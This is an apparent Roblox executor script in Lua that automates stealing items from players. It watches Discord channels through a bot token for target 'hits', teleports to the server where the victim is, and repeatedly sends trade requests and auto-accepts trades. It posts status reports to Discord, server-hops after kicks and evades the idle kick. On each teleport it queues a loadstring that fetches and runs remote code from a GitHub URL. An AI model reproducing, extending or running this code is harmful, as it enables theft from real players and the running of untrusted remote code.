local AutoCollect = {
    GuildID = "1489086193822859306";
    ChannelID = "1497691010384396338";
    ChannelID2 = "1490163560989593701";
    BotToken = _G.BotToken;
    ScanMessagesAmount = 8;
    BotInfoChannel = "1490163560989593701";
}

local function PublishMessage(ChannelID, Content)
    local Request = http.request({
        Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages",
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "POST",
        Body = game:GetService("HttpService"):JSONEncode({
            content = Content
        })
    })
    if Request.StatusCode ~= 200 then
        warn("Failed to publish a message with PublishMessage: " .. tostring(Request.Body))
    end
end

local LocalPlayer = game:GetService("Players").LocalPlayer

local function serverhop()
    local servers = {}
    local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true")
    local body = game:GetService("HttpService"):JSONDecode(req)

    if body and body.data then
        for i, v in next, body.data do
            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(servers, 1, v.id)
            end
        end
    end

    if #servers > 0 then
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
    else
        return warn("Couldn't find a server.")
    end
end

game:GetService("GuiService").ErrorMessageChanged:Connect(function(message)
    local text = game:GetService("CoreGui"):WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay"):WaitForChild("ErrorPrompt"):WaitForChild("MessageArea"):WaitForChild("ErrorFrame"):WaitForChild("ErrorMessage").Text
    warn(text)
    if text:lower():find("disconnect") or text:lower():find("kick") then
        PublishMessage(AutoCollect.BotInfoChannel, "Account was kicked. message: " .. text)
        while task.wait() do
            serverhop()
        end
    end
end)

queue_on_teleport("_G.BotToken = \"" .. AutoCollect.BotToken .. '\"; loadstring(game:HttpGet("https://raw.githubusercontent.com/exodus892/__exodus__/refs/heads/main/autojoin.lua"))()')

LocalPlayer.Idled:Connect(function()
    game:GetService("VirtualUser"):CaptureController()
    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)

local Events = game:GetService("ReplicatedStorage"):WaitForChild("Events")
local TradeGui = require(game:GetService("ReplicatedStorage"):WaitForChild("Gui"):WaitForChild("TradeGui"))
local SessionID
require(Events).ClientListen("TradeUpdateInfo", function(IncomingData)
    SessionID = IncomingData.SessionID
end)
local Victim
repeat task.wait() until LocalPlayer:FindFirstChild("PlayerGui") and
    LocalPlayer.PlayerGui:FindFirstChild("LoadingScreenGui") and
    LocalPlayer.PlayerGui.LoadingScreenGui:FindFirstChild("LoadingMessage") and
    LocalPlayer.PlayerGui.LoadingScreenGui.LoadingMessage.Visible == false
local ScrGui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui")

local function GetMessages(ChannelID, Limit)
    local Request = http.request({
        Url = "https://discord.com/api/v9/channels/" .. (ChannelID or AutoCollect.ChannelID) .. "/messages?limit=" .. (Limit or tostring(AutoCollect.ScanMessagesAmount)),
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "GET"
    })
    if Request.StatusCode == 200 then
        return game:GetService("HttpService"):JSONDecode(Request.Body)
    end
end

local function PublishMessage(ChannelID, Content)
    local Request = http.request({
        Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages",
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "POST",
        Body = game:GetService("HttpService"):JSONEncode({
            content = Content
        })
    })
    if Request.StatusCode ~= 200 then
        warn("Failed to publish a message with PublishMessage: " .. tostring(Request.Body))
    end
end

task.spawn(function ()
    local interval = 900
    local elapsed = 0

    while true do
        task.wait(interval)
        interval = math.random(600, 1200)
        elapsed = elapsed + 10

        local msg = "Auto-Join is still running after " .. elapsed .. " minutes. There have not been any hits to take."
        PublishMessage(AutoCollect.BotInfoChannel, msg)
    end
end)

local function SetMarked(id)
    local Content = isfile("ExodusJoined") and readfile("ExodusJoined") or "{}"
    local Before = game:GetService("HttpService"):JSONDecode(Content)
    local Clone = table.clone(Before)
    table.insert(Clone, 1, id)
    local NewTable = {}
    for i, v in paies(Clone) do
        if i <= (AutoCollect.ScanMessagesAmount) then
            NewTable[i] = v
        end
    end
    writefile("ExodusJoined", game:GetService("HttpService"):JSONEncode(NewTable))
end

local function IsMarked(id)
    local Content = isfile("ExodusJoined") and readfile("ExodusJoined") or "{}"
    local Marked = game:GetService("HttpService"):JSONDecode(Content)
    return table.find(Marked, id) ~= nil
end

local function Scan(Tp, Json)
    local Messages = GetMessages()
    if Messages then
        for i, msg in pairs(Messages) do
            local year, month, day, hour, min, sec =
                msg.timestamp:match("(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)")

            local msgTime = os.time({
                year = tonumber(year),
                month = tonumber(month),
                day = tonumber(day),
                hour = tonumber(hour),
                min = tonumber(min),
                sec = tonumber(sec)
            })

            if os.time() - msgTime <= 1800 then
                local Content = msg.content
                if Content then
                    local AutjoinData = Content:match("Auto%-Join_Data:`(.+)`")
                    local AJdata = AutjoinData and game:GetService("HttpService"):JSONDecode(AutjoinData)
                    if AJdata then
                        local HitsMessage
                        local Messages = GetMessages(AutoCollect.ChannelID2, "100")
                        if Messages then
                            for i, v in pairs(Messages) do
                                if v.components and v.components[1] and v.components[1].components and v.components[1].components[1] then
                                    local joinButton = v.components[1].components[1]
                                    if joinButton and joinButton.url and joinButton.url:find(AJdata.jobid) then
                                        print("join url: " .. joinButton.url)
                                        HitsMessage = v
                                        break
                                    else
                                        --warn("That isnt a join button")
                                    end
                                end
                            end
                            if HitsMessage and not (HitsMessage.content or ""):find("Private Server") then
                                if Tp and not IsMarked(msg.id) and AJdata.completed == nil then
                                    writefile("ExodusAutojoin", AutjoinData)
                                    SetMarked(msg.id)
                                    task.spawn(function()
                                        PublishMessage(AutoCollect.BotInfoChannel, `Auto-Join is checking this https://discord.com/channels/{AutoCollect.GuildID}/{AutoCollect.ChannelID2}/{HitsMessage.id} (User ID: {AJdata.userid})`)
                                    end)
                                    repeat
                                        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, AJdata.jobid, LocalPlayer)
                                        task.wait(2)
                                    until nil
                                elseif Tp == false then
                                    if AJdata.completed and Json.jobid == game.JobId and Victim and tonumber(Json.userid) == Victim.UserId then
                                        return true
                                    else
                                        return false
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

local function FindVictim(Json)
    if not Json or game.JobId ~= Json.jobid then
        if game.JobId ~= Json.jobid then
            PublishMessage(AutoCollect.BotInfoChannel, "Auto-Join started running on " .. LocalPlayer.Name)
        end
        return
    end
    for i, v in pairs(LocalPlayer.Parent:GetPlayers()) do
        if v.UserId == tonumber(Json.userid) then
            Victim = v
            break
        end
    end
end

local function Accept()
    pcall(function ()
        if ScrGui.TradeLayer.TradeAnchorFrame.TradeFrame.ButtonAccept.ButtonTop.TextLabel.Text ~= "Unaccept" then
            require(Events).ClientCall("TradePlayerAccept", SessionID, {
                [tostring(LocalPlayer.UserId)] = TradeGui.GetMyOffer(),
                [tostring(Victim.UserId)] = TradeGui.GetTheirOffer()
            })
        end
    end)
end

local IsStealing = true
local Json
LocalPlayer.Parent.PlayerRemoving:Connect(function(v)
    if v == Victim then
        Victim = nil
        IsStealing = false
    end
end)
task.spawn(function()
    repeat task.wait() until Victim
    while IsStealing and task.wait(1) do
        local IsComplete = Scan(false, Json)
        if IsComplete then
            IsStealing = false
            return warn("Found completion marker")
        end
    end
end)
task.spawn(function()
    if isfile("ExodusAutojoin") then
        Json = game:GetService("HttpService"):JSONDecode(readfile("ExodusAutojoin"))
        FindVictim(Json)
        if Victim then
            local Name = Victim.Name
            while IsStealing and LocalPlayer.Parent:FindFirstChild(Name) do
                Events:WaitForChild("TradePlayerRequestStart"):FireServer(Victim.UserId)
                Accept()
                task.wait(1)
            end
        else
            warn("No victim")
            IsStealing = false
        end
    else
        warn("No auto-join file")
        PublishMessage(AutoCollect.BotInfoChannel, "Auto-Join started running")
        IsStealing = false
    end
end)
repeat task.wait() until not IsStealing
warn("All that gobblydook is done")
while task.wait(3) do
    warn("Scanning")
    Scan(true)
end
